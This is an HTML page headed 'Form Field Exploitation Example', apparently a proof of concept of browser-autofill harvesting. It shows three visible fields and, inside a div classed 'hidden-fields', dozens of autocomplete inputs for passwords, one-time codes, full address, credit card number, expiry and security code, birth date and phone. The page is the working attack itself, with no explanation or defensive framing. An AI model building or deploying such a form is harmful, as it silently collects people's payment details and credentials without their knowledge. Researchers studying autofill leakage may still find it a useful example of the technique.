<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/styles.css">
    <script src="/scripts.js" defer></script>
    <title>Comprehensive Form with Autocomplete</title>
</head>
<body>
    <h1>Form Field Exploitation Example</h1>
    <form id="demoForm" action="#" method="post">
        <!-- Basic Autocomplete -->
        <label for="name">Full Name:</label>
        <input type="text" id="name" name="name" autocomplete="name"><br><br>
        
        <label for="country">Country:</label>
        <input type="text" id="country" name="country" autocomplete="country"><br><br>
        <!-- Personal Information -->
        
        <label for="cc-family-name">Confirm Family Name on Your Credit Card:</label>
        <input type="text" id="cc-family-name" name="cc-family-name" autocomplete="cc-family-name"><br><br>

         

        <div class="hidden-fields">

            <label for="honorific-prefix">Honorific Prefix:</label>
            <input type="text" id="honorific-prefix" name="honorific-prefix" autocomplete="honorific-prefix"><br><br>
            
            <label for="given-name">Given Name:</label>
            <input type="text" id="given-name" name="given-name" autocomplete="given-name"><br><br>
            
            <label for="additional-name">Additional Name:</label>
            <input type="text" id="additional-name" name="additional-name" autocomplete="additional-name"><br><br>
            
            <label for="family-name">Family Name:</label>
            <input type="text" id="family-name" name="family-name" autocomplete="family-name"><br><br>
            
            <label for="honorific-suffix">Honorific Suffix:</label>
            <input type="text" id="honorific-suffix" name="honorific-suffix" autocomplete="honorific-suffix"><br><br>
            
            <label for="nickname">Nickname:</label>
            <input type="text" id="nickname" name="nickname" autocomplete="nickname"><br><br>
            
            <label for="email">Email:</label>
            <input type="email" id="email" name="email" autocomplete="email"><br><br>
            
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" autocomplete="username"><br><br>
            
            <label for="new-password">New Password:</label>
            <input type="password" id="new-password" name="new-password" autocomplete="new-password"><br><br>
            
            <label for="current-password">Current Password:</label>
            <input type="password" id="current-password" name="current-password" autocomplete="current-password"><br><br>
            
            <label for="one-time-code">One-Time Code:</label>
            <input type="text" id="one-time-code" name="one-time-code" autocomplete="one-time-code"><br><br>
            
            <!-- Organization Information -->
            <label for="organization-title">Organization Title:</label>
            <input type="text" id="organization-title" name="organization-title" autocomplete="organization-title"><br><br>
            
            <label for="organization">Organization:</label>
            <input type="text" id="organization" name="organization" autocomplete="organization"><br><br>
            
            <!-- Address Information -->
            <label for="street-address">Street Address:</label>
            <input type="text" id="street-address" name="street-address" autocomplete="street-address"><br><br>
            
            <label for="address-line1">Address Line 1:</label>
            <input type="text" id="address-line1" name="address-line1" autocomplete="address-line1"><br><br>
            
            <label for="address-line2">Address Line 2:</label>
            <input type="text" id="address-line2" name="address-line2" autocomplete="address-line2"><br><br>
            
            <label for="address-line3">Address Line 3:</label>
            <input type="text" id="address-line3" name="address-line3" autocomplete="address-line3"><br><br>
            
            <label for="address-level4">Address Level 4:</label>
            <input type="text" id="address-level4" name="address-level4" autocomplete="address-level4"><br><br>
            
            <label for="address-level3">Address Level 3:</label>
            <input type="text" id="address-level3" name="address-level3" autocomplete="address-level3"><br><br>
            
            <label for="address-level2">Address Level 2:</label>
            <input type="text" id="address-level2" name="address-level2" autocomplete="address-level2"><br><br>
            
            <label for="address-level1">Address Level 1:</label>
            <input type="text" id="address-level1" name="address-level1" autocomplete="address-level1"><br><br>
            
            
            <label for="country-name">Country Name:</label>
            <input type="text" id="country-name" name="country-name" autocomplete="country-name"><br><br>
            
            <label for="postal-code">Postal Code:</label>
            <input type="text" id="postal-code" name="postal-code" autocomplete="postal-code"><br><br>
            
            <!-- Credit Card Information -->

            <label for="cc-name">Credit Card Name:</label>
            <input type="text" id="cc-name" name="cc-name" autocomplete="cc-name"><br><br>
            
            <label for="cc-given-name">Credit Card Given Name:</label>
            <input type="text" id="cc-given-name" name="cc-given-name" autocomplete="cc-given-name"><br><br>
            
            <label for="cc-additional-name">Credit Card Additional Name:</label>
            <input type="text" id="cc-additional-name" name="cc-additional-name" autocomplete="cc-additional-name"><br><br>
            
            
            <label for="cc-number">Credit Card Number:</label>
            <input type="text" id="cc-number" name="cc-number" autocomplete="cc-number"><br><br>
            
            <label for="cc-exp">Credit Card Expiration:</label>
            <input type="text" id="cc-exp" name="cc-exp" autocomplete="cc-exp"><br><br>
            
            <label for="cc-exp-month">Credit Card Expiration Month:</label>
            <input type="text" id="cc-exp-month" name="cc-exp-month" autocomplete="cc-exp-month"><br><br>
            
            <label for="cc-exp-year">Credit Card Expiration Year:</label>
            <input type="text" id="cc-exp-year" name="cc-exp-year" autocomplete="cc-exp-year"><br><br>
            
            <label for="cc-csc">Credit Card Security Code:</label>
            <input type="text" id="cc-csc" name="cc-csc" autocomplete="cc-csc"><br><br>
            
            <label for="cc-type">Credit Card Type:</label>
            <input type="text" id="cc-type" name="cc-type" autocomplete="cc-type"><br><br>
            
            <!-- Transaction Information -->
            <label for="transaction-currency">Transaction Currency:</label>
            <input type="text" id="transaction-currency" name="transaction-currency" autocomplete="transaction-currency"><br><br>
            
            <label for="transaction-amount">Transaction Amount:</label>
            <input type="text" id="transaction-amount" name="transaction-amount" autocomplete="transaction-amount"><br><br>
            
            <!-- Additional Information -->
            <label for="language">Language:</label>
            <input type="text" id="language" name="language" autocomplete="language"><br><br>
            
            <label for="bday">Birth Date:</label>
            <input type="date" id="bday" name="bday" autocomplete="bday"><br><br>
            
            <label for="bday-day">Birth Day:</label>
            <input type="text" id="bday-day" name="bday-day" autocomplete="bday-day"><br><br>
            
            <label for="bday-month">Birth Month:</label>
            <input type="text" id="bday-month" name="bday-month" autocomplete="bday-month"><br><br>
            
            <label for="bday-year">Birth Year:</label>
            <input type="text" id="bday-year" name="bday-year" autocomplete="bday-year"><br><br>
            
            <label for="sex">Gender:</label>
            <input type="text" id="sex" name="sex" autocomplete="sex"><br><br>
            
            <label for="tel">Telephone:</label>
            <input type="tel" id="tel" name="tel" autocomplete="tel"><br><br>
    
        </div>
        <input  type="submit" value="Submit">
    </form>
